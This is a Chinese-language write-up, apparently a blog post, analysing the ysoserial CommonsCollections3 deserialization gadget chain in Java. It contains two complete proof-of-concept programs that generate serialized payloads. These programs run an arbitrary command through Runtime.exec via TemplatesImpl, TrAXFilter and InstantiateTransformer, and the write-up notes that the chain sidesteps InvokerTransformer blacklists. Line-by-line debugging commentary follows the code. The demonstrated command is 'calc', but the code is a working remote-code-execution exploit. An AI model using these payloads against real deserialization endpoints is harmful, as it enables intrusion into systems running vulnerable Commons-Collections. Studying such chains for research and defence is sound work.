## ysoserial_CommonCollections3

> 本机环境：
>
> JDK版本：jdk1.7u_51
>
> CC版本：Commons-Collections 3.2.1

简介：

CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。

在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。

在 CC2 中，使用 TemplatesImpl 的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。

而在 CC3 中，使用了 CC1 和 LazyMap 和 CC2的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式。

利用链：

```
ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InstantiateTransformer.transform()
                            newInstance()
                                TrAXFilter#TrAXFilter()
                                TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
```



## POC&复现

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections3{
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("snakin");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("  Runtime.getRuntime().exec(\"" + cmd + "\");" );
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", bytecodes);
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        setFieldValue(transformerChain, "iTransformers", transformers);
        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

运行即可

![image-20220718155013056](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718155013056.png)

## 调试分析

为什么需要CC3，主要是绕过黑名单避免我们使⽤ `InvokerTransformer`⼿⼯调⽤ `newTransformer() `⽅法。

### TrAXFilter

在 SAX API 中提供了一个过滤器接口 `org.xml.sax.XMLFilter`，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。

`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter` 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性，

TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 。

![image-20220718160242933](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718160242933.png)

### InstantiateTransformer

Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 `transform()` 方法实际上接收一个 Class 类型的对象，通过 `getConstructor` 获取构造方法，并通过 `newInstance` 创建类实例。

![image-20220718160958662](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718160958662.png)

如果我们把input设置为TrAXFilter，那么就会在这里实例化的时候调用其构造方法，触发`TemplatesImpl#newTransformer`。

之后就和cc1的TransformedMap链一样的触发方式了，这里不做过多分析。



### 利用链2

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections3{
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("snakin");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("  Runtime.getRuntime().exec(\"" + cmd + "\");" );
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", bytecodes);
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(TrAXFilter.class),
                        new InstantiateTransformer(
                                new Class[]{Templates.class},
                                new Object[]{obj}
                        )
                }
        );

        Map lazyMap = LazyMap.decorate(
                new HashMap(),
                chainedTransformer
        );

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler)constructor.newInstance(Override.class, lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        InvocationHandler handlerPayload = (InvocationHandler)constructor.newInstance(Override.class, mapProxy);

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handlerPayload);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();


    }
}
```

调用栈在最上方。

其主要区别为利用了`LazyMap.get()`调用`this.factory.transform()`，当实例化传入Transformer，调用get方法就会触发transform()方法

```java
public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

而由于key未知，但是提供了ConstantTransformer，无论输入是什么输出都是定值，因此构造ChainedTransformer：

![image-20220718171143896](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718171143896.png)

生成lazymap

![image-20220718171258351](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718171258351.png)

之后我们利用**Proxy动态代理+AnnotationInvocationHandler调用LazyMap.get()**

`AnnotationInvocationHandler.invoke()`在调用除去指定的方法的其他Map类方法时进入default调用get方法

![image-20220718171931438](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718171931438.png)

而memberValues刚好是实例化AnnotationInvocationHandler传入的Map

```java
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }
```

之后构造动态代理**代理一个Map类型，反序列化时通过 readObject 来触发 invoke，再触发 get 再触发 transform**从而执行恶意代码。

其实这里也就是cc1的Lzaymap链。
